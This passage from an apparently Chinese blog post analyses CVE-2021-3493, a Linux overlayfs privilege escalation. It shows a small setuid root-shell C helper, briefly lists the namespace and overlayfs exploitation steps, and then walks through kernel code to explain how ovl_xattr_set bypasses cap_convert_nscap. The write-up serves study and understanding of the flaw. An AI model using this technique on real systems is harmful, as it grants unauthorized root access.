class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code> 非常简单，就是 <code>setuid</code> 和 <code>setgid</code> 为 <code>0</code>，也就是 <code>root</code>。</p><p>然后我们再创建一个 <code>user namepsace</code> 和 <code>mount namespace</code> 。</p><p>在 <code>./merge</code> 当中，我们为刚刚编译的 <code>exp</code> 设置 <code>setuid</code> 的权限。</p><p>然后再开一个终端，我们发现 <code>upper</code> 目录中的 <code>exp</code> 同样具有了 <code>setuid</code> 的权限，说明我们的权限逃逸成功了。</p><p><img src="/2022/08/31/CVE-2021-3493/11.png" alt="11"></p><p>我们运行 <code>exp</code> 成功获得了真实的 <code>root</code> 权限。</p><p><img src="/2022/08/31/CVE-2021-3493/12.png" alt="12"></p><h2 id="内核代码分析"><a href="#内核代码分析" class="headerlink" title="内核代码分析"></a>内核代码分析</h2><h3 id="namespace结构"><a href="#namespace结构" class="headerlink" title="namespace结构"></a>namespace结构</h3><p>首先我第一步呢，就是去求证了一下我上面的猜想是否正确，在 <a href="https://github.com/torvalds/linux/blob/64222515138e43da1fcf288f0289ef1020427b87/include/linux/user_namespace.h">github</a> 上找到对应的 <code>namespace</code> 的代码，这里不用管什么版本了，大体变化是不会很大的，我们先来看 <code>user_namespace</code> 结构体的定义：</p><p><img src="/2022/08/31/CVE-2021-3493/13.png" alt="13"></p><p>我们很清楚地能看到里面的一个定义：<code>user_namespace *parent</code>，这里也能说明，它是存在父子关系的，和我们之前的猜测大体是一样的，并且会标注 <code>owner</code> 和 <code>group</code>，这里应该是创建这个 <code>namespace</code> 的属主和属组。我们同时也看到还有一个 <code>level</code> 变量，这里我大概猜测一下，是 <code>namespace</code> 的深度，也就是往后迭代了多少次，这个学过算法设计应该还是好理解的，我在建立树的时候，我们一般也会标记深度方便去查找，我猜测在这里我们需要的就是进行权限检查，如果 <code>namespace</code> 双方为父子关系，那么我们直接看父亲的权限即可，然而实际情况比较复杂，首先谁是父亲谁是儿子就很难判断，所以我跟上深度能很容易知道谁是父亲谁是儿子，如果不是父子关系，那么我们可以查 <code>LCA</code> 找到最近公共祖先，看看两个 <code>namespace</code> 的创建者权限如何。</p><p>我们找到对应的 <code>user_namespace.c</code> 文件，看看创建一个 <code>namespace</code> 的时候发生了什么。这里推荐给大家读内核代码的一些思路：大部分的代码都会写一个完全不带安全检查的函数，比如我创建一个 <code>namespace</code>，那么我们一定能找到只实现创建 <code>namespace</code> 的一个函数，这个函数通常会在进行了一系列安全检查之后才允许被调用，包括我们平时做一些网站开发之类的也一样，我们会写一个定向只做某些事情的接口，但是接口不会直接被调用而是会进行一系列安全检查，诸如非法数据判断和权限问题，我们默认传进去的参数都是合法的，它常规的三部曲就是：检查，执行，善后。那么言归正传，看到代码</p><h5 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h5><p><img src="/2022/08/31/CVE-2021-3493/14.png" alt="14"></p><p>参数应该是一个父进程，因为它在第一行写了 <code>parent_ns=new-&gt;user_ns</code>，<code>parent_ns</code> 我们很容易知道是父 <code>namespace</code>，而这里传进去的是一个 <code>cred</code> 结构体，结构体中有一个 <code>user_ns</code> 应该是 <code>user_namespace</code>。下面两行设置了 <code>euid</code> 和 <code>egid</code>，那么很清晰了，<code>owner</code> 和 <code>group</code> 就是创建这个 <code>namespace</code> 的属主和属组。</p><p>下面有一个如果父进程的 <code>user namepsace</code> 层数超过 <code>32</code> 那么直接 <code>goto fail</code>，那就是说这里不允许这棵树创建超过32的深度。</p><p>后面执行一个 <code>inc_user_namespaces</code> 函数并判断是否执行成功，我们往下深挖一下代码，这里因为代码比较短，就贴这里了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ucounts *<span class="title">inc_ucount</span><span class="params">(struct user_namespace *ns, <span class="keyword">kuid_t</span> uid,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">enum</span> ucount_type type)</span><span class="comment">//in kernel/ucount.c</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>, *<span class="title">iter</span>, *<span class="title">bad</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">tns</span>;</span></span><br><span class="line">ucounts = alloc_ucounts(ns, uid);</span><br><span class="line"><span class="keyword">for</span> (iter = ucounts; iter; iter = tns-&gt;ucounts) &#123;</span><br><span class="line"><span class="keyword">long</span> max;</span><br><span class="line">tns = iter-&gt;ns;</span><br><span class="line">max = READ_ONCE(tns-&gt;ucount_max[type]);</span><br><span class="line"><span class="keyword">if</span> (!atomic_long_inc_below(&amp;iter-&gt;ucount[type], max))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ucounts;</span><br><span class="line">fail:</span><br><span class="line">bad = iter;</span><br><span class="line"><span class="keyword">for</span> (iter = ucounts; iter != bad; iter = iter-&gt;ns-&gt;ucounts)</span><br><span class="line">atomic_long_dec(&amp;iter-&gt;ucount[type]);</span><br><span class="line"></span><br><span class="line">put_ucounts(ucounts);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> struct ucounts *<span class="title">inc_user_namespaces</span><span class="params">(struct user_namespace *ns, <span class="keyword">kuid_t</span> uid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> inc_ucount(ns, uid, UCOUNT_USER_NAMESPACES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出来，这里应该只是分配一个 <code>ucounts</code> 结构体的内存，我猜测 <code>ucounts</code> 应该是 <code>namespace</code> 的衍生类，因为我们看到 <code>inc_user_namespace</code> 增加 <code>user namespace</code> 实际就是调用增加 <code>ucounts</code> 的一个方法，并且估计其它的 <code>namespace</code> 也需要通过这个调用来分配内存，并且我们观察枚举类也能发现有我们所有 <code>namespace</code> 的一个定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ucount_type</span> &#123;</span></span><br><span class="line">UCOUNT_USER_NAMESPACES,</span><br><span class="line">UCOUNT_PID_NAMESPACES,</span><br><span class="line">UCOUNT_UTS_NAMESPACES,</span><br><span class="line">UCOUNT_IPC_NAMESPACES,</span><br><span class="line">UCOUNT_NET_NAMESPACES,</span><br><span class="line">UCOUNT_MNT_NAMESPACES,</span><br><span class="line">UCOUNT_CGROUP_NAMESPACES,</span><br><span class="line">UCOUNT_TIME_NAMESPACES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INOTIFY_USER</span></span><br><span class="line">UCOUNT_INOTIFY_INSTANCES,</span><br><span class="line">UCOUNT_INOTIFY_WATCHES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FANOTIFY</span></span><br><span class="line">UCOUNT_FANOTIFY_GROUPS,</span><br><span class="line">UCOUNT_FANOTIFY_MARKS,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">UCOUNT_RLIMIT_NPROC,</span><br><span class="line">UCOUNT_RLIMIT_MSGQUEUE,</span><br><span class="line">UCOUNT_RLIMIT_SIGPENDING,</span><br><span class="line">UCOUNT_RLIMIT_MEMLOCK,</span><br><span class="line">UCOUNT_COUNTS,</span><br><span class="line">&#125;;<span class="comment">//in user_namespace.h</span></span><br></pre></td></tr></table></figure><p>但是去看了 <code>ucounts</code> 结构体的定义发现里面就定义了一个 <code>user_namespace</code> 的指针和一个链表，队列，以及标识了一个 <code>uid</code>。这个 <code>ucounts</code> 可能只是一个用于做某些标记的东西，我们暂且不管把先。</p><p>后面有一个 <code>current_chrooted</code> 函数，我们同样看看它的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">current_chrooted</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* Does the current process have a non-standard root */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">ns_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">fs_root</span>;</span></span><br><span class="line"><span class="keyword">bool</span> chrooted;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find the namespace root */</span></span><br><span class="line">ns_root.mnt = &amp;current-&gt;nsproxy-&gt;mnt_ns-&gt;root-&gt;mnt;</span><br><span class="line">ns_root.dentry = ns_root.mnt-&gt;mnt_root;</span><br><span class="line">path_get(&amp;ns_root);</span><br><span class="line"><span class="keyword">while</span> (d_mountpoint(ns_root.dentry) &amp;&amp; follow_down_one(&amp;ns_root))</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">get_fs_root(current-&gt;fs, &amp;fs_root);</span><br><span class="line"></span><br><span class="line">chrooted = !path_equal(&amp;fs_root, &amp;ns_root);</span><br><span class="line"></span><br><span class="line">path_put(&amp;fs_root);</span><br><span class="line">path_put(&amp;ns_root);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> chrooted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释以及关键的语句 <code>chrooted = !path_equal(&amp;fs_root, &amp;ns_root);</code> 我们大概也能猜测出来，它应该就是判断 <code>namespace</code> 的根目录是否于文件系统一致，一致才允许你创建这个 <code>namespace</code>。</p><h5 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h5><p><img src="/2022/08/31/CVE-2021-3493/15.png" alt="15"></p><p>然后在这里需要判断一下属主和数组是否映映射到了父 <code>namespace</code> 上。</p><p>后面的话基本上和我们复现的漏洞无关了，我们这么来了解了一下构成形式，<code>namespace</code> 确实是树状图形式，而且下面我们很清楚地能看到 <code>ns-&gt;level=parent_ns-&gt;level+1</code>。</p><h3 id="权限设置"><a href="#权限设置" class="headerlink" title="权限设置"></a>权限设置</h3><p>这里我们来查看对应版本的代码，<a href="https://elixir.bootlin.com/linux/v4.14.291/source/fs/xattr.c">链接贴上</a>。</p><p>先来看到 <code>416</code> 行，对 <code>setxattr</code> 函数进行分析，这里解释一下 <code>setxattr</code> 的一个名字由来（自己意淫的，非官方说法，经供参考），<code>set</code> 就是设置， <code>x</code> 其实它可以代表 <code>extended</code> 扩展的，<code>attr</code> 就是属性了，连起来就是<strong>设置扩展属性</strong>，这里的扩展属性就是指 <code>capability</code>。其实我感觉吧， <code>x</code> 好像能表示一切 <code>ex</code> 开头的单词，比如我们经常见到的三个权限位，用 <code>x</code> 标识 <code>execute</code>。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Extended attribute SET operations</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"><span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line"><span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">error = -ERANGE;</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line"><span class="keyword">return</span> -E2BIG;</span><br><span class="line">kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!kvalue)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">posix_acl_fix_xattr_from_user(kvalue, size);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kname, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">error = cap_convert_nscap(d, &amp;kvalue, size);</span><br><span class="line"><span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">size = error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = vfs_setxattr(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">kvfree(kvalue);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乍一看逻辑有点小复杂，主要是很多的宏定义和很多没见过的函数，也不太能够望文生义，于是我找到了Linux手册对于 <code>setxattr</code> 的说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$man 2 setxattr</span><br></pre></td></tr></table></figure><blockquote><p>setxattr()  sets the value of the extended attribute identified by name and associated with the given path in the filesystem.  The  size  argument  specifies  the  size  (in bytes) of value; a zero-length value is permitted.</p></blockquote><p>貌似介绍的也比较笼统，还是靠自己试试吧。</p><h4 id="part1-1"><a href="#part1-1" class="headerlink" title="part1"></a>part1</h4><p><code>flags &amp; ~(XATTR_CREATE|XATTR_REPLACE)</code>，这其实是很常见的掩码写法，差不多意思就是 <code>flag</code> 标志只在 <code>create</code> 和 <code>replace</code> 位上设置，如果设置了其它位则退出。</p><p><code>strncpy_from_user(kname, name, sizeof(kname))</code> 对传入的 <code>name</code> 参数进行拷贝，拷贝到了 <code>kname</code> 也就是内核栈当中。第一个判断应该是判断空字符串和防止溢出，因为如果 <code>sizeof(kname)</code> 字节都被占满了那么这个字符串还会跟下面连续的字符串相连，造成一些错误。</p><p>这里出现了我的知识盲区，这里也来解释一下，在内核里面，看见全大写字母的变量基本都不是变量，都是宏定义。而我实在不知道字符串常量有直接拼接的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s1 <span class="meta-string">&quot;123&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s2 <span class="meta-string">&quot;456&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> s3 s1 s2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(s3);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*output: </span></span><br><span class="line"><span class="comment">123456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>我还以为是宏定义的特殊写法呢，这里mark一下。</p><p>这里给出这些宏定义的最终结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_POSIX_ACL_ACCESS <span class="meta-string">&quot;system.posix_acl_access&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_POSIX_ACL_DEFAULT <span class="meta-string">&quot;system.posix_acl_default&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XATTR_NAME_CAPS <span class="meta-string">&quot;security.capability&quot;</span></span></span><br></pre></td></tr></table></figure><p>那么第一个 <code>if</code> 我们 <code>duck</code> 不必关心，我们主要关心第二个跟 <code>capability</code> 相关的分支。</p><p>我们具体逻辑也不进一步分析了，我们就看看这个函数给的注释：</p><p><code>This function will then take care to map the inode according to @mnt_userns before checking permissions.</code></p><p>我们也不难看出来，在检查权限之前就是会对文件系统和 <code>user namespace </code> 进行映射，这个函数叫 <code>cap_convert_nscap</code>，那其实就是对 <code>capability</code> 的 <code>userns</code> 进行一个映射了（应该是这个意思。</p><p>就是可能，它会在不同的 <code>namespace</code> 上嘛，比如这个文件夹是其中一个 <code>user namespace</code> 创建的，不可能我换一个 <code>namespace</code> 去检测权限也是相同的手法，肯定是要把权限映射一下的，映射到同一个 <code>namespace</code> 上才能进行权限检查。</p><p>经过一系列检查之后，走到了 <code>vfs_setxattr</code>，也就是虚拟文件系统的扩展属性设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfs_setxattr</span><span class="params">(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> dentry-&gt;d_inode;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">error = xattr_permission(inode, name, MAY_WRITE);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">inode_lock(inode);</span><br><span class="line">error = security_inode_setxattr(dentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = __vfs_setxattr_noperm(dentry, name, value, size, flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一条不深入挖下去了，就是判断有没有写的权限，然后上锁，防止发生竞争，然后进行 <code>security_inode_setxattr</code> 函数进行进一步的权限校验，最后执行 <code>__vfs_setxattr_noperm</code> 函数，它的后缀 <code>noperm</code> 就是还没有进行权限检查的 <code>__vfs_setxattr</code> 与我们之前说的分析思路是一致的。在这个函数里面有一个大 <code>if</code> 判断文件是否有权限，最终调用一个 <code>__vfs_setxattr</code> 去真实设置 <code>xattr</code>。</p><p>因此我们可以发现，在调用设置文件扩展属性时候，会有一系列的检查，比如你是否是 <code>root</code>，你对文件操作是否有权限之类的，因为即使你是 <code>root</code> 也得看看那个文件系统的权限是否归你所有，有可能是其它 <code>user_namespace</code> 的用户创建的，那么你有可能也是没有权限的，这个地方是不会出现越权行为的。</p><p>然后我们看到 <code>overlayfs</code> 的设置文件扩展属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ovl_xattr_set</span><span class="params">(struct dentry *dentry, struct inode *inode, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">void</span> *value, <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">upperdentry</span> =</span> ovl_i_dentry_upper(inode);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">realdentry</span> =</span> upperdentry ?: ovl_dentry_lower(dentry);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old_cred</span>;</span></span><br><span class="line"></span><br><span class="line">err = ovl_want_write(dentry);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!value &amp;&amp; !upperdentry) &#123;</span><br><span class="line">err = vfs_getxattr(realdentry, name, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_drop_write;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!upperdentry) &#123;</span><br><span class="line">err = ovl_copy_up(dentry);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out_drop_write;</span><br><span class="line"></span><br><span class="line">realdentry = ovl_dentry_upper(dentry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">old_cred = ovl_override_creds(dentry-&gt;d_sb);</span><br><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">err = vfs_setxattr(realdentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">WARN_ON(flags != XATTR_REPLACE);</span><br><span class="line">err = vfs_removexattr(realdentry, name);</span><br><span class="line">&#125;</span><br><span class="line">revert_creds(old_cred);</span><br><span class="line"></span><br><span class="line">out_drop_write:</span><br><span class="line">ovl_drop_write(dentry);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;<span class="comment">///fs/overlayfs/inode.c</span></span><br></pre></td></tr></table></figure><p>其它的我们不看，我们解释比较容易理解的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!upperdentry) &#123;</span><br><span class="line">    err = ovl_copy_up(dentry);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> out_drop_write;</span><br><span class="line"></span><br><span class="line">    realdentry = ovl_dentry_upper(dentry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个地方其实就是我们说的，如果文件在 <code>lower</code> 当中，那么拷贝一份到 <code>upper</code> 当中去，然后把新的文件节点指向 <code>upper</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value)</span><br><span class="line">err = vfs_setxattr(realdentry, name, value, size, flags);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">WARN_ON(flags != XATTR_REPLACE);</span><br><span class="line">err = vfs_removexattr(realdentry, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接调用 <code>vfs_setxattr</code> 函数了，我们知道在 <code>vfs_setxattr</code> 之前有一个入口，也就是 <code>setxattr</code> 这个地方会有一个调用，调用 <code>cap_convert_nscap</code> 函数去检查  <code>user namespace</code> 是否一致。而这里直接调用 <code>vfs_setxattr</code> 这个函数就绕过了 <code>namespace</code> 的检查。</p><p>所以我们之前的利用步骤就是先创建了一个 <code>namespace</code>，然后挂载了一个 <code>overlayfs</code>，在 <code>merge</code> 文件夹中是我们创建的 <code>fs namespace</code>，因此我们创建的 <code>root</code> 用户对这个 <code>fs namespace</code> 有设置 <code>capability</code> 的操作权限，这个其实没有问题，因为我即使运行了这个 <code>a.out</code> 也不会有真正的 <code>root</code> 权限，有的只是我们创建的这个 <code>user namespace</code> 的 <code>root</code> 权限，而这个权限实际是 <code>init</code> 的 <code>user</code> 创建的，因此实际操作还是获得不了真实的 <code>root</code>，但是问题就是 <code>overlayfs</code> 的这个特性：我们修改了 <code>merge</code> 中的 <code>a.out</code> 会反向修改之前在 <code>upper</code> 中的 <code>a.out</code>，因此我们给它 <code>setuid</code> 的权限导致了 